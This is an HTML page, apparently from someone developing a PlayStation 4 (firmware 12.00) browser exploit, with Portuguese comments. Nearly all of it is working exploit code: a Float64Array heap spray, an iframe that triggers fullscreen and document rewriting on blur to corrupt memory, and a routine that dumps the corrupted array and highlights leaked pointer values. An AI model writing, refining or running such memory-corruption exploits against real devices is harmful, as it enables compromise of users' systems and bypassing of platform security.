<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - Base Modification - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - Estabilidade Restaurada</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>

    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Gatilho Original)</button>
    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (Dump)</button>

    <hr>
    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px;"></div>

    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; // 0x4141414141414141
        let controllers = [];
        const statusPai = document.getElementById('status-pai');
        const leakOutput = document.getElementById('leak-output');

        // PASSO 1: Exatamente como no seu sucesso
        function prepareObjects() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(8);
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "5000 Objetos prontos. Use o Iframe.";
            statusPai.style.color = "blue";
            leakOutput.style.display = "none";
        }

        // PASSO 2: O seu Iframe, com uma alteração microscópica no spray
        function setupIframe() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
            
            const frame = document.getElementById('pocFrame');
            const fDoc = frame.contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html>
                <body>
                    <button onclick="startPoC()" style="padding:10px;">START (FS + OPTIONS)</button>
                    <script>
                        window.startPoC = function() {
                            if (document.documentElement.webkitRequestFullscreen) 
                                document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() {
                                let spray = [];
                                
                                // A MODIFICAÇÃO CIRÚRGICA:
                                for(let i = 0; i < 8000; i++) {
                                    if (i % 4 === 0) {
                                        // 25% das vezes: O seu colisor exato para garantir a corrupção do ID 0
                                        let p = new Float64Array(10);
                                        p.fill(${PATTERN});
                                        spray.push(p);
                                    } else {
                                        // 75% das vezes: Objeto JS genérico e leve para sujar a RAM vizinha
                                        // Sem usar objetos pesados que quebram o timing!
                                        spray.push({ prop1: 1, prop2: 2, prop3: 3, prop4: i });
                                    }
                                }
                                
                                // O seu timing exato de sucesso
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h1>FINALIZADO</h1>');
                                    document.close();
                                }, 1000);
                            };
                        };
                    <\/script>
                </body>
                </html>
            `);
            fDoc.close();
            statusPai.innerText = "Iframe Pronto. Sequência: FS -> OPTIONS.";
        }

        // PASSO 3: Leitura original + Highlight de ponteiros
        function checkPersistence() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                // Checagem exata do seu sucesso original
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            if (corrupted) {
                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: ID " + corruptedIndex + " corrompido!</span>";
                leakOutput.style.display = "block";
                leakOutput.innerHTML = "<b>[ LOG DE MEMÓRIA ]</b><br><br>";

                for(let i = 0; i < 8; i++) {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    
                    // Pinta de vermelho se vazar algo que não seja 0 ou 414141...
                    let isPointer = (hex !== "0000000000000000" && !hex.includes("414141"));
                    let style = isPointer ? "color:#fff; background:#a00; padding:2px;" : "";
                    
                    leakOutput.innerHTML += "Offset [" + i + "]: <span style='" + style + "'>0x" + hex + "</span><br>";
                }
            } else {
                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Reinicie o navegador para limpar o GC.</span>";
            }
        }
    </script>
</body>
</html>
